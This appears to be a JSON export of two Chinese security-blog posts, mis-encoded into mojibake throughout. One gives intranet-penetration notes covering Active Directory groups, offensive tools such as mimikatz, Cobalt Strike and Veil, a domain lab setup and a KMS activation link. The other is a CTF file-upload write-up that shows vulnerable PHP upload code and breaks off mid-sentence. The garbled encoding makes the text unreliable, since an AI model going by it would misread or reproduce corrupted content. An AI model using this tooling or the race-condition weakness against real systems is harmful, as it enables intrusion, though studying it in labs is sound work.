å®‰å…¨çº§åˆ«æœ€é«˜ åˆ†ä¸ºæ ¸å¿ƒåŒºï¼ˆå­˜å‚¨ä¼ä¸šæœ€é‡è¦çš„æ•°æ®ï¼Œåªæœ‰å¾ˆå°‘çš„ä¸»æœºèƒ½å¤Ÿè®¿é—®ï¼‰å’ŒåŠå…¬åŒºï¼ˆå‘˜å·¥æ—¥å¸¸å·¥ä½œåŒºï¼Œä¸€èˆ¬èƒ½å¤Ÿè®¿é—®DMZï¼Œéƒ¨åˆ†ä¸»æœºå¯ä»¥è®¿é—®æ ¸å¿ƒåŒºï¼‰ 5.2 DMZï¼ˆDemilitarized Zoneï¼‰ è¾¹ç•Œç½‘ç»œï¼Œéš”ç¦»åŒºï¼Œå®‰å…¨çº§åˆ«ä¸­ç­‰ ä½œä¸ºå†…ç½‘ä¸­å®‰å…¨ç³»ç»Ÿå’Œéå®‰å…¨ç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºï¼Œç”¨äºå¯¹å¤–æä¾›æœåŠ¡ï¼Œä¸€èˆ¬å¯ä»¥æ”¾ç½®ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ 5.3 å¤–ç½‘ Internetï¼Œå®‰å…¨çº§åˆ«æœ€ä½ æ‹¥æœ‰DMZçš„ç½‘ç»œéœ€è¦åˆ¶å®šä¸€äº›è®¿é—®æ§åˆ¶ç­–ç•¥ï¼š 1.å†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘ 2.å†…ç½‘å¯ä»¥è®¿é—®DMZ 3.å¤–ç½‘ä¸èƒ½è®¿é—®å†…ç½‘ 4.å¤–ç½‘å¯ä»¥è®¿é—®DMZ 5.DMZä¸èƒ½è®¿é—®å†…ç½‘ 6.DMZä¸èƒ½è®¿é—®å¤–ç½‘ 0x06 åŸŸä¸­è®¡ç®—æœºçš„åˆ†ç±» åŸŸæ§åˆ¶å™¨ã€æˆå‘˜æœåŠ¡å™¨ã€å®¢æˆ·æœºã€ç‹¬ç«‹æœåŠ¡å™¨ åŸŸæ§åˆ¶å™¨ï¼šç”¨äºç®¡ç†æ‰€æœ‰çš„ç½‘ç»œè®¿é—®ï¼Œå­˜å‚¨åŸŸå†…æ‰€æœ‰çš„è´¦æˆ·å’Œç­–ç•¥ä¿¡æ¯ã€‚å…è®¸ç½‘ç»œä¸­æ‹¥æœ‰å¤šå°åŸŸæ§åˆ¶å™¨ï¼ˆå®¹ç¾ï¼‰ æˆå‘˜æœåŠ¡å™¨ï¼šå®‰è£…äº†æœåŠ¡å™¨æ“ä½œç³»ç»Ÿå¹¶åŠ å…¥äº†åŸŸï¼Œä½†æ²¡æœ‰å®‰è£…æ´»åŠ¨ç›®å½•çš„è®¡ç®—æœºï¼Œä¸»è¦ä»»åŠ¡æ˜¯æä¾›ç½‘ç»œèµ„æº å®¢æˆ·æœºï¼šå®‰è£…äº†å…¶ä»–æ“ä½œç³»ç»Ÿçš„è®¡ç®—æœºï¼Œåˆ©ç”¨è¿™äº›è®¡ç®—æœºå’ŒåŸŸä¸­çš„è´¦æˆ·å°±å¯ä»¥ç™»å½•åˆ°åŸŸã€‚ ç‹¬ç«‹æœåŠ¡å™¨ï¼šå’ŒåŸŸæ— å…³ï¼Œæ—¢ä¸åŠ å…¥åŸŸï¼Œä¹Ÿæ²¡æœ‰æ´»åŠ¨ç›®å½• åŸŸæ§åˆ¶å™¨æ˜¯å­˜æ”¾æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„ï¼Œæ˜¯åŸŸä¸­å¿…é¡»è¦æœ‰çš„ï¼Œè€Œå…¶ä»–ä¸‰ç§åˆ™ä¸æ˜¯å¿…é¡»çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç®€å•çš„åŸŸå¯ä»¥åªåŒ…å«ä¸€å°è®¡ç®—æœºï¼Œè¿™å°è®¡ç®—æœºå°±æ˜¯è¯¥åŸŸçš„åŸŸæ§åˆ¶å™¨ã€‚ åŸŸä¸­å„ä¸ªæœåŠ¡å™¨çš„è§’è‰²ä¹Ÿæ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œä¾‹å¦‚åŸŸæœåŠ¡å™¨åœ¨åˆ é™¤æ´»åŠ¨ç›®å½•æ—¶ï¼Œå¦‚æœæ˜¯åŸŸä¸­æœ€åä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œåˆ™è¯¥åŸŸæœåŠ¡å™¨ä¼šæˆä¸ºç‹¬ç«‹æœåŠ¡å™¨ï¼Œå¦‚æœä¸æ˜¯åŸŸä¸­å”¯ä¸€çš„åŸŸæ§åˆ¶å™¨ï¼Œåˆ™å°†ä½¿è¯¥æœåŠ¡å™¨æˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚ åŒæ—¶ç‹¬ç«‹æœåŠ¡å™¨æ—¢å¯ä»¥è½¬æ¢ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œä¹Ÿå¯ä»¥åŠ å…¥åˆ°æŸä¸ªåŸŸæˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚ 0x07 åŸŸå†…æƒé™ ç»„ï¼š ç»„ï¼ˆGroupï¼‰æ˜¯ç”¨æˆ·å¸å·çš„é›†åˆã€‚é€šè¿‡å‘ä¸€ç»„ç”¨æˆ·åˆ†é…æƒé™ä»è€Œä¸å¿…å‘æ¯ä¸ªç”¨æˆ·åˆ†é…æƒé™ï¼Œç®¡ç†å‘˜åœ¨æ—¥å¸¸å·¥ä½œä¸­ä¸å¿…è¦å»ä¸ºå•ä¸ªç”¨æˆ·å¸å·è®¾ç½®è‡ªå·±ç‹¬ç‰¹çš„è®¿é—®æƒé™ï¼Œè€Œæ˜¯å°†ç”¨æˆ·å¸å·åŠ å…¥åˆ°ç›¸å¯¹åº”çš„å®‰å…¨ç»„ä¸­ã€‚ç®¡ç†å‘˜é€šè¿‡ç»™ç›¸å¯¹çš„å®‰å…¨ç»„è®¿é—®æƒé™å°±å¯ä»¥äº†ï¼Œè¿™æ ·æ‰€æœ‰åŠ å…¥åˆ°å®‰å…¨ç»„çš„ç”¨æˆ·å¸å·éƒ½å°†æœ‰åŒæ ·çš„æƒé™ã€‚ä½¿ç”¨å®‰å…¨ç»„è€Œä¸æ˜¯å•ä¸ªçš„ç”¨æˆ·å¸å·å¯ä»¥æ–¹ä¾¿ï¼Œç®€åŒ–ç½‘ç»œçš„ç»´æŠ¤å’Œç®¡ç†å·¥ä½œã€‚ åŸŸæœ¬åœ°ç»„ï¼š å¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æºï¼ˆè®¿é—®åŒä¸€ä¸ªåŸŸï¼‰ã€‚å¯ä»¥ä»ä»»ä½•åŸŸæ·»åŠ ç”¨æˆ·è´¦æˆ·ã€é€šç”¨ç»„å’Œå…¨å±€ç»„ï¼Œåªèƒ½åœ¨å…¶æ‰€åœ¨åŸŸå†…æŒ‡æ´¾æƒé™ã€‚åŸŸæœ¬åœ°ç»„ä¸èƒ½åµŒå¥—äºå…¶ä»–ç»„ä¸­ã€‚å®ƒä¸»è¦æ˜¯ç”¨äºæˆäºˆä½äºæœ¬åŸŸèµ„æºçš„è®¿é—®æƒé™ã€‚ å…¨å±€ç»„ï¼š å•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼ˆå¿…é¡»æ˜¯åŒä¸€ä¸ªåŸŸé‡Œé¢çš„ç”¨æˆ·ï¼‰ã€‚åªèƒ½åœ¨åˆ›å»ºè¯¥å…¨å±€ç»„çš„åŸŸä¸Šè¿›è¡Œæ·»åŠ ç”¨æˆ·å’Œå…¨å±€ç»„ï¼Œå¯ä»¥åœ¨åŸŸæ£®æ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå…¨å±€ç»„å¯ä»¥åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ã€‚ é€šç”¨ç»„ï¼š é€šç”¨ç»„æˆå‘˜æ¥è‡ªåŸŸæ—ä¸­ä»»ä½•åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œå…¶ä»–çš„é€šç”¨ç»„ï¼Œå¯ä»¥åœ¨è¯¥åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå¯ä»¥åµŒå¥—äºå…¶ä»–åŸŸç»„ä¸­ã€‚éå¸¸é€‚äºåŸŸæ—ä¸­çš„è·¨åŸŸè®¿é—®ã€‚ å¯ä»¥ç®€å•è¿™æ ·è®°å¿†ï¼š åŸŸæœ¬åœ°ç»„ï¼šæ¥è‡ªå…¨æ—ç”¨äºæœ¬åŸŸ å…¨å±€ç»„ï¼šæ¥è‡ªæœ¬åŸŸç”¨äºå…¨æ— é€šç”¨ç»„ï¼šæ¥è‡ªå…¨æ—ç”¨äºå…¨æ— 0x07 A-G-DL-Pç­–ç•¥ï¼š Aï¼šç”¨æˆ·è´¦æˆ· Gï¼šå…¨å±€ç»„ DLï¼šåŸŸæœ¬åœ°ç»„ Pï¼šè®¸å¯ï¼Œèµ„æºæƒé™ å…ˆå°†ç”¨æˆ·è´¦å·æ·»åŠ è‡³å…¨å±€ç»„ä¸­ï¼Œå†å°†å…¨å±€ç»„æ·»åŠ è‡³åŸŸæœ¬åœ°ç»„ä¸­ï¼Œç„¶åä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºæƒé™ã€‚æŒ‰ç…§AGDLPçš„åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œç»„ç»‡å’Œç®¡ç†èµ·æ¥æ›´å®¹æ˜“ã€‚ åœ¨AGDLPå½¢æˆä»¥å,å½“ç»™ä¸€ä¸ªç”¨æˆ·æŸä¸€ä¸ªæƒé™çš„æ—¶å€™,åªè¦æŠŠè¿™ä¸ªç”¨æˆ·åŠ å…¥åˆ°æŸä¸€ä¸ªæœ¬åœ°åŸŸç»„å°±å¯ä»¥äº†ã€‚ 0x08 åŸŸå†…æƒé™è§£è¯» 8.1 åŸŸæœ¬åœ°ç»„ æ¥è‡ªå…¨æ—ä½œç”¨äºæœ¬åŸŸ Administratorsï¼ˆç®¡ç†å‘˜ç»„ï¼‰ â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™ Remote Desktop Users(è¿œç¨‹ç™»å½•ç»„) Print Operatorsï¼ˆæ‰“å°æœºæ“ä½œå‘˜ç»„ï¼‰ Account Operatorsï¼ˆå¸å·æ“ä½œå‘˜ç»„ï¼‰ Server Operatersï¼ˆæœåŠ¡å™¨æ“ä½œå‘˜ç»„ï¼‰ Backup Operatorsï¼ˆå¤‡ä»½æ“ä½œå‘˜ç»„ï¼‰ 8.2 å…¨å±€ç»„ æ¥è‡ªæœ¬åŸŸä½œç”¨äºå…¨æ— 8.3 é€šç”¨ç»„ æ¥è‡ªå…¨æ—ä½œç”¨äºå…¨æ— 8.4 å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™ Domain Adminsï¼ˆåŸŸç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€æœ€æœ€é‡è¦çš„æƒé™ï¼Œä¸€èˆ¬æ¥è¯´åŸŸæ¸—é€æ˜¯çœ‹é‡è¿™ä¸ª Enterprise Adminsï¼ˆä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™ï¼Œå…¶æ¬¡æ˜¯å»çœ‹é‡è¿™ä¸ªæƒé™ Schema Adminsï¼ˆæ¶æ„ç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™ Domain Usersï¼ˆåŸŸç”¨æˆ·ç»„) 1.é€šå¸¸DNSæœåŠ¡å™¨ä¸åŸŸæ§åˆ¶å™¨ä¼šåœ¨åŒä¸€å°æœºå™¨ä¸Š 2.ä¸€ä¸ªåŸŸå†…è‡³å°‘éœ€è¦ä¸¤å°DCï¼Œéœ€è¦ä¸€å°ç”¨ä½œå¤‡ä»½ äºŒã€å¸¸ç”¨å·¥å…·åˆ†ç±» 0x01 ä¸»æœºå¹³å°åŠå¸¸ç”¨å·¥å…·æ€»ç»“ WCEï¼ˆWindowså‡­æ®ç®¡ç†å™¨ï¼‰ minikatzï¼ˆä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç ï¼‰ Responderï¼ˆå—…æ¢ç½‘ç»œä¸­æ‰€æœ‰çš„LLMNRåŒ…ï¼Œè·å–ä¸»æœºçš„ä¿¡æ¯ï¼‰ BeEFï¼ˆä¸€æ¬¾é’ˆå¯¹æµè§ˆå™¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼‰ DSHashesï¼ˆä»NTDSXtractä¸­æå–ç”¨æˆ·æ˜“äºç†è§£çš„æ•£åˆ—å€¼ï¼‰ PowerSploitï¼ˆä¸€æ¬¾åŸºäºPowerShellçš„åæ¸—é€æµ‹è¯•æ¡†æ¶ï¼‰ Nishangï¼ˆä¸€æ¬¾é’ˆå¯¹Powershellçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼‰ Empireï¼ˆä¸€æ¬¾å†…ç½‘æ¸—é€æµ‹è¯•åˆ©å™¨ï¼‰ ps_encoder.pyï¼ˆä½¿ç”¨Base64ç¼–ç å°è£…çš„Powershellå‘½ä»¤åŒ…ï¼‰ smbexecï¼ˆä¸€ä¸ªä½¿ç”¨sambaå·¥å…·çš„å¿«é€ŸpsExecå·¥å…·ï¼‰ åé—¨åˆ¶é€ å·¥å‚ï¼ˆå¯¹PEã€ELFç­‰äºŒè¿›åˆ¶æ³¨å…¥Shellcodeï¼‰ Veilï¼ˆç”¨äºç”Ÿæˆç»•è¿‡å¸¸è§æ€è½¯çš„Metasploitæœ‰æ•ˆè½½è·ï¼‰ Metasploitï¼ˆè®¡ç®—æœºå®‰å…¨æ¼æ´é¡¹ç›®æ¡†æ¶ï¼‰ Cobalt Strikeï¼ˆä¸€æ¬¾ä¼˜ç§€çš„åæ¸—é€æµ‹è¯•å¹³å°ï¼‰ 0x02 Windowsæ¸—é€å¸¸ç”¨å·¥å…· Nmapï¼ˆä¸€æ¬¾å…è´¹çš„ç½‘ç»œå‘ç°å’Œå®‰å…¨å®¡è®¡å·¥å…·ï¼‰ Wiresharkï¼ˆä¸€æ¬¾å…è´¹ä¸”å¼€æºçš„ç½‘ç»œåè®®å’Œæ•°æ®åŒ…è§£æå™¨ï¼‰ PuTTYï¼ˆä¸€æ¬¾å…è´¹ä¸”å¼€æºçš„SSHå’ŒTelnetå®¢æˆ·ç«¯ï¼‰ SQLMapï¼ˆä¸€æ¬¾å…è´¹ä¸”å¼€æºçš„SQLæ³¨å…¥å·¥å…·ï¼‰ BurpSuiteï¼ˆä¸€æ¬¾é’ˆå¯¹Webåº”ç”¨ç¨‹åºè¿›è¡Œå®‰å…¨æµ‹è¯•çš„ä»£ç†å·¥å…·ï¼‰ Hydraï¼ˆä¸€ä¸ªç½‘ç»œç™»å½•æš´åŠ›ç ´è§£å·¥å…·ï¼‰ Getifï¼ˆä¸€æ¬¾æ”¶é›†SNMPè®¾å¤‡ä¿¡æ¯çš„å·¥å…·ï¼‰ Cain&amp;Abelï¼ˆä¸€ä¸ªå¯†ç æ¢å¤å·¥å…·ï¼Œé›†æˆå—…æ¢ç­‰å¤šç§åŠŸèƒ½ï¼‰ PowerSploitï¼ˆä¸€æ¬¾åŸºäºPowerShellçš„åæ¸—é€æµ‹è¯•æ¡†æ¶ï¼‰ Nishangï¼ˆä¸€æ¬¾é’ˆå¯¹Powershellçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼‰ 0x03 PowerShellåŸºæœ¬å‘½ä»¤ 3.1 æŸ¥çœ‹Powershellç‰ˆæœ¬ Get-Host $PSVersionTable.PSVERSION 3.2 Powershell å¸¸ç”¨å‘½ä»¤ New-Item hack -ItemType Directory #æ–°å»ºç›®å½• New-Item ailx0000.txt -ItemType File #æ–°å»ºæ–‡ä»¶ Set-Content .\\ailx0000.txt -Value \"hi hacker ailx10...\" #å†™æ–‡ä»¶ Add-Content .\\ailx0000.txt -Value \"ooops~\" #è¿½åŠ å†…å®¹ Get-Content .\\ailx0000.txt #æ˜¾ç¤ºå†…å®¹ Clear-Content .\\ailx0000.txt #æ¸…æ¥šå†…å®¹ Remove-Item .\\ailx0000.txt #åˆ é™¤æ–‡ä»¶ 3.3 å¸¸è§ç”¨é€” 1ã€ç»•è¿‡æœ¬åœ°æƒé™å¹¶æ‰§è¡Œ 2ã€ä»ç½‘ç«™æœåŠ¡å™¨ä¸­ä¸‹è½½è„šæœ¬ï¼Œç»•è¿‡æœ¬åœ°æƒé™å¹¶å·å·æ‰§è¡Œ 3ã€ä½¿ç”¨Base64å¯¹PowerShellå‘½ä»¤è¿›è¡Œç¼–ç  ä¸‰ã€å†…ç½‘ç¯å¢ƒæ­å»º å®éªŒï¼šæ­å»ºå†…ç½‘ç¯å¢ƒ 1.æ­å»ºåŸŸç¯å¢ƒ å®éªŒç¯å¢ƒ å·¥å…·ï¼š vmvareã€winserver2012ã€winserver2008ã€win7é•œåƒ ä¸‹è½½åœ°å€ï¼šMSDN 1ã€winserver2012 R2æ­å»º 1.é¦–å…ˆé…ç½®win12çš„ipåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥å…ˆipconfigæŸ¥çœ‹å…¶åœ°å€å’Œé»˜è®¤ç½‘å…³ç­‰ï¼Œç„¶åé…ç½®æˆå…¶é™æ€IPç­‰ã€‚ è¿™é‡Œåº”è¯¥æ˜¯192.168.17.129ï¼ˆç…§ç‰‡é”™è¯¯ï¼‰ 2.åœ¨æ§åˆ¶é¢æ¿-ç³»ç»Ÿå’Œå®‰å…¨-ç³»ç»Ÿ-é«˜çº§ç³»ç»Ÿè®¾ç½®ã€åŸŸå’Œå·¥ä½œç»„-è®¡ç®—æœºåâ€“æ›´æ”¹â€“è®¡ç®—æœºå 3.å®‰è£…åŸŸæ§åˆ¶å™¨å’ŒdnsæœåŠ¡ã€‚ é€‰æ‹©æœåŠ¡å™¨ç®¡ç†å™¨ï¼Œé€‰æ‹©æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½å‘å¯¼ï¼Œåœ¨æœåŠ¡å™¨è§’è‰² é€‰æ‹©DNSæœåŠ¡å™¨ åœ¨æœåŠ¡å™¨è§’è‰²çª—å£é€‰æ‹©Active DirectoryåŸŸæœåŠ¡å’ŒDNSæœåŠ¡å™¨ ä¸€è·¯é»˜è®¤è®¾ç½®åˆ°ç¡®è®¤é¡µé¢ å‹¾é€‰è‡ªåŠ¨é‡æ–°å¯åŠ¨æœåŠ¡å™¨ï¼Œç„¶åå®‰è£…ã€‚ 4.å‡çº§æœåŠ¡å™¨ å®‰è£…å®Œæ¯•åã€‚ç‚¹å‡»å°†æ­¤æœåŠ¡å™¨æå‡ä¸ºåŸŸæ§åˆ¶å™¨ åœ¨Active DirectoryåŸŸæœåŠ¡é…ç½®å‘å¯¼ç•Œé¢ï¼Œåœ¨éƒ¨ç½²é…ç½®éƒ¨åˆ†å•å‡»é€‰ä¸­â€æ·»åŠ æ–°æ—â€ï¼Œç„¶åè¾“å…¥æ ¹åŸŸåâ€hacke.testlabâ€(å¿…é¡»ä½¿ç”¨ç¬¦åˆDNSå‘½åçº¦å®šçš„æ ¹åŸŸå)ã€‚ åœ¨åŸŸæ§åˆ¶å™¨é€‰é¡¹éƒ¨åˆ†ï¼Œå°†æ—åŠŸèƒ½çº§åˆ«ï¼ŒåŸŸåŠŸèƒ½çº§åˆ«éƒ½è®¾ç½®æˆâ€Windows Server 2012 R2â€ã€‚åˆ›å»ºåŸŸæ—æ—¶ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹åº”é€‰æ‹©DNSæœåŠ¡å™¨ï¼Œæ—ä¸­çš„ç¬¬ä¸€ä¸ªåŸŸæ§åˆ¶å™¨å¿…é¡»æ˜¯å…¨å±€ç›®å½•æœåŠ¡å™¨ä¸”ä¸èƒ½æ˜¯åªè¯»åŸŸæ§åˆ¶å™¨ï¼ˆRODCï¼‰ã€‚ç„¶åï¼Œè®¾ç½®ç›®å½•æœåŠ¡è¿˜åŸæ¨¡å¼çš„å¯†ç ï¼ˆåœ¨å¼€æœºè¿›å…¥å®‰å…¨æ¨¡å¼ä¿®å¤æ´»åŠ¨ç›®å½•æ•°æ®åº“æ—¶ä½¿ç”¨æ­¤å¯†ç ï¼‰ ç„¶ååˆ°DNSé€‰é¡¹ï¼Œä¼šå‡ºç°å…³äºDNSçš„è­¦å‘Šã€‚ä¸ç”¨ç†ä¼šè­¦å‘Šï¼Œä¿æŒé»˜è®¤è®¾ç½®ã€‚ ç„¶åä¸€è·¯éƒ½æ˜¯é»˜è®¤é…ç½® å®‰è£…å®Œæˆåé‡å¯ 5.åˆ›å»ºActive Directory ç”¨æˆ· ä¸ºwin2008å’Œwin7ç”¨æˆ·åˆ›å»ºåŸŸæ§åˆ¶å™¨è´¦æˆ·ã€‚ åœ¨â€Active Directoryâ€ç”¨æˆ·å’Œè®¡ç®—æœºç•Œé¢ä¸­é€‰æ‹©â€Usersâ€ç›®å½•å¹¶å•å‡»å³é”®ï¼Œä½¿ç”¨å¼¹å‡ºçš„å¿«æ·èœå•æ·»åŠ ç”¨æˆ·ã€‚ åˆ›å»ºtestuserè´¦æˆ· 2ã€Win2008 R2æœåŠ¡å™¨ 1.é…ç½®IP Windows Server 2008 R2 çš„IPåœ°å€å’ŒDNSæœåŠ¡å™¨åœ°å€å¦‚ä¸‹ï¼š æµ‹è¯•ä¸€ä¸‹ï¼Œping hacker.testlab 2.åŠ å…¥åŸŸ è¾“å…¥åŸŸçš„åç§°ï¼Œç‚¹å‡»â€ç¡®å®šâ€ï¼Œéšåä¼šè®©è¾“å…¥è®¾ç½®çš„ç”¨æˆ·åå’Œå¯†ç ï¼š é‡å¯è®¡ç®—æœºï¼Œç™»é™† è¾“å…¥net view /domain:hackeræŸ¥çœ‹åŸŸç”¨æˆ·ï¼Œ(æ¯å°åŸŸå†…æœºå™¨å‡å¯æŸ¥çœ‹) æ­å»ºäº†ä¸€ä¸ªç®€å•çš„åŸŸç¯å¢ƒ æ³¨ï¼šå¦‚æœå‡ºç°6118çš„é—®é¢˜ï¼Œç™¾åº¦å°±å¯ä»¥è§£å†³ï¼Œä¸€èˆ¬å°±æ˜¯é˜²ç«å¢™å’ŒComputer Browseræœªå¼€å¯çš„é—®é¢˜ å‚è€ƒï¼šnet view æ—¶æŠ¥é”™ å‘ç”Ÿç³»ç»Ÿé”™è¯¯ 6118 è§£å†³ 3ã€Win7æœåŠ¡å™¨ 1.å…ˆæ›´æ”¹ipåœ°å€ï¼Œç„¶åè®¾ç½®dnsåœ°ï¼Œç„¶åpingä¸€ä¸‹è¯•è¯•ã€‚ 2.pingé€šï¼Œè¯´æ˜å‰åŠéƒ¨åˆ†æ­å»ºæˆåŠŸã€‚ 3.æ›´æ”¹è®¡ç®—æœºåï¼Œæ›´æ”¹ä¸ºwin7-X64-testï¼Œå°†åŸŸåæ›´æ”¹ä¸ºhacker.testlab 4.ç„¶åè¾“å…¥åŸŸç®¡ç†å‘˜çš„è´¦å·å’Œå¯†ç åï¼Œç«‹å³é‡å¯ã€‚ è¿™é‡Œåœ¨win7ä½¿ç”¨net user /domainå‘½ä»¤æ—¶ï¼Œæ€»æ˜¯æŠ¥é”™ï¼šå‘ç”Ÿç³»ç»Ÿé”™è¯¯5ï¼Œç™¾åº¦äº†å¾ˆå¤šï¼Œæœ‰çš„è¯´æ˜¯æƒé™é—®é¢˜ï¼Œä½†æˆ‘å³ä½¿ä»¥ç®¡ç†å‘˜èº«ä»½ä¹Ÿä¸è¡Œã€‚æœ€åçœ‹äº†Nå¤šç¯‡æ­å»ºæ–‡ç« ï¼Œä¹Ÿæ²¡å•¥æˆæœï¼Œä½†æ˜¯çœ‹äº†ä¸€ç¯‡æ–‡ç« è¯´ï¼Œé‡å¯åæˆ‘ä»¬ä»¥åŸŸç®¡ç†å‘˜çš„èº«ä»½ç™»å½•win7å³å¯ å¦‚ä¸Šå›¾æˆåŠŸäº†ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸æ¸…æ¥šæ˜¯å¦ä¸ä»¥åŸŸç®¡ç†å‘˜ç™»å½•ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤ï¼Œä½†æˆ‘æ„Ÿè§‰åº”è¯¥æ˜¯æ­å»ºè¿‡ç¨‹ä¸­å°‘äº†ç‚¹ä»€ä¹ˆï¼Œè¿™é‡Œä¹Ÿæ²¡æ·±ç©¶ã€‚ ä¸è¿‡ä¼¼ä¹è¦å®é™…åŠ å…¥åŸŸç¯å¢ƒä¸­éœ€è¦ç”¨åŸŸè´¦å·ç™»å½•ï¼Œæˆ–è®¸è¿™é‡Œæˆ‘å­˜åœ¨ç€ç†è§£é”™è¯¯ åˆ°æ­¤æ­å»ºäº†ä¸€ä¸ªæœ€ç®€å•çš„å†…ç½‘ç¯å¢ƒï¼Œä»¥åæœ‰éœ€è¦åœ¨æ¥ç€æ­å»ºï¼Œç°åœ¨å°±å…ˆå­¦ä¹ äº†è§£ä¸€ä¸‹ï¼Œä¸ºå®æˆ˜åšå‡†å¤‡ã€‚ å››ã€å‚è€ƒæ–‡ç«  å†…ç½‘æ¸—é€]å†…ç½‘åŸºç¡€çŸ¥è¯† å†…ç½‘æ¸—é€ä¹‹åŸºç¡€çŸ¥è¯† å†…ç½‘æ¸—é€åŸºçŸ³ç¯‡ï¼šå†…ç½‘åŸºç¡€çŸ¥è¯†åŠåŸŸç¯å¢ƒæ­å»º å†…ç½‘æ¸—é€ç¯å¢ƒæ­å»º å†…ç½‘æ¸—é€-ç¯å¢ƒæ­å»º åŸŸæ¸—é€ç¬”è®°-åŸŸç¯å¢ƒæ­å»º é¡ºä¾¿è®°å½•ä¸€ä¸ªæ¿€æ´»ç³»ç»Ÿçš„è½¯ä»¶åœ°å€ï¼šç¥é¾™KMSæ¥æ¿€æ´»çš„ç³»ç»Ÿï¼Œå¾ˆæ–¹ä¾¿ http://www.yishimei.cn/network/319.html","tags":["å†…ç½‘æ¸—é€"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"æ”»é˜²ä¸–ç•Œ-wzsc_æ–‡ä»¶ä¸Šä¼ ","path":"/2023/09/03/wzsc-wen-jian-shang-chuan/","content":"é¢˜ç›®æè¿°ï¼š æ³°å±±æ¯ é¢˜ç›®è§£é¢˜ï¼š é¦–å…ˆ ä¸Šä¼ äº†å‡ ä¸ªæ–‡ä»¶è¯•è¯•æ°´ ï¼Œå‘ç°ä¸è®ºä¸Šä¼ ä»€ä¹ˆï¼Œä»–å‡ä¼šé‡å®šå‘åˆ°upload.phpé¡µé¢ï¼Œäºæ˜¯æˆ‘diræ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°äº† uploadè·¯ç”±ï¼Œè®¿é—®çœ‹çœ‹ è¿™é‡Œ 1.jpgæ˜¯æ­£å¸¸å›¾ç‰‡æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰ä½ ä¸Šä¼ çš„æ–‡ä»¶ç¬¦åˆé¢˜ç›®è¦æ±‚ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šä¿å­˜åœ¨è¯¥ç›®å½•ä¸‹ï¼Œè¿™é‡Œ æœ‰ä¸€ä¸ªhint.txtæ–‡ä»¶ Ãƒâ€“_0 0vO Ow0 0w0 Ãƒâ€“_0 Ãƒâ€“_O Ãƒâ€“.O o_o 0.O OvO o.0 owo o.Ãƒâ€“ Ãƒâ€“.Ãƒâ€“ Ovo 0_Ãƒâ€“ Ãƒâ€“_o owO O.0 owo Ãƒâ€“_o owO O.0 owo Ãƒâ€“_0 0wÃƒâ€“ O.0 0w0 Ãƒâ€“_0 OwO ov0 owo o_O O.Ãƒâ€“ Ãƒâ€“vo é‡Œé¢ å†…å®¹å¦‚ä¸Šï¼Œä¸è¿‡ä¸æ¸…æ¥šæ˜¯ä»€ä¹ˆ åŠ å¯†ï¼Œå…ˆæç€ï¼Œå‚è€ƒwpå‘ç°ä»–ä»¬ ç›´æ¥æœ‰äº†æºç ï¼Œé‚£ä¼°è®¡ä¸Šè¿°åŠ å¯†åº”è¯¥è¡¨è¾¾çš„æ˜¯æºæ–‡ä»¶æ‰€åœ¨å¤„ è¿™é‡Œå…ˆè¿›è¡Œå®¡è®¡ &lt;?php $allowtype = array(\"txt\",\"jpeg\",\"bmv\",\"doc\",\"docx\",\"gif\",\"png\",\"jpg\"); //ç™½åå• $size = 10000000; $path = \"./upload/\"; $filename = $_FILES['file']['name']; if (is_uploaded_file($_FILES['file']['tmp_name'])){ if (!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){ exit(); } } else { exit(); } $newfile = $path.$filename; if ($_FILES['file']['error'] &gt; 0){ //è‹¥ä¸Šä¼ çš„æ–‡ä»¶æŠ¥é”™ï¼Œåˆ™åˆ é™¤ unlink($newfile); exit(); } $ext = array_pop(explode(\".\",$_FILES['file']['name']));//è‹¥ä¸Šä¼ çš„æ–‡ä»¶åç¼€åä¸åœ¨ç™½åå•å†…ï¼Œåˆ™åˆ é™¤ if (!in_array($ext,$allowtype)){ unlink($newfile); exit(); } ?&gt; è¿™é‡Œä¹Ÿæ˜¯ çœ‹äº†wpæ‰çŸ¥é“å¯ä»¥åˆ©ç”¨ç«äº‰ ç«äº‰åŸç†ï¼š 1.ç½‘ç«™å…è®¸ä¸Šä¼ 